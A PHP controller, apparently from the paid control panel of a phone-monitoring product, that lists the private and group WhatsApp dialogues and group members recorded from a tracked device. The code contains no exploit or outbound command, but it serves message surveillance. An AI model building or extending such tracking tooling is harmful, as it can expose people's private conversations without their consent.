<?php

namespace Controllers;

use System\FlashMessages;

class Whatsapp extends BaseController {

    protected $module = 'whatsapp';

    protected function init() {
        parent::init();

        $this->initCP();
    }

    public function indexAction() {
        $whatsappModel = new \Models\Cp\Whatsapp($this->di);

        if ($this->isAjaxRequest()) {
            $dataTableRequest = new \System\DataTableRequest();

            $dataTableRequest->getRequest($_GET, array('timeFrom', 'timeTo'));
            $this->checkDisplayLength($dataTableRequest->getDisplayLength());
            if ($this->params['tab'] === 'private') {
                $this->makeJSONResponse($whatsappModel->getPrivateDataTableData($this->di['devId'], $dataTableRequest->getResult()));
            } elseif ($this->params['tab'] === 'group') {
                $this->makeJSONResponse($whatsappModel->getGroupDataTableData($this->di['devId'], $dataTableRequest->getResult()));
            }
        }

        if ($this->view->paid) {
            $this->view->hasRecords = $whatsappModel->hasRecords($this->di['devId']);
        }
        
        $this->setView('cp/whatsapp.htm');
    }

    public function listAction() {
        $whatsappModel = new \Models\Cp\Whatsapp($this->di);

        switch ($this->params['tab']) {
            case 'group':
                $this->view->list = $whatsappModel->getGroupList($this->di['devId'], $this->params['id']);
                $this->view->users = $whatsappModel->getGroupUsers($this->di['devId'], $this->params['id']);
                break;

            case 'private':
                $this->view->list = $whatsappModel->getPrivateList($this->di['devId'], $this->params['id']);
                break;

            default:
                break;
        }

        if (!count($this->view->list)) {
            $this->di['flashMessages']->add(FlashMessages::ERROR, $this->di['t']->_('The dialogue has not been found!'));
            $this->redirect($this->di['router']->getRouteUrl('whatsapp'));
        }

        $this->view->tab = $this->params['tab'];
        
        $this->setView('cp/whatsappList.htm');
    }

    protected function postAction() {
        parent::postAction();
        $this->buildCpMenu();

        $this->view->title = $this->di['t']->_('Whatsapp Tracking');
    }

}
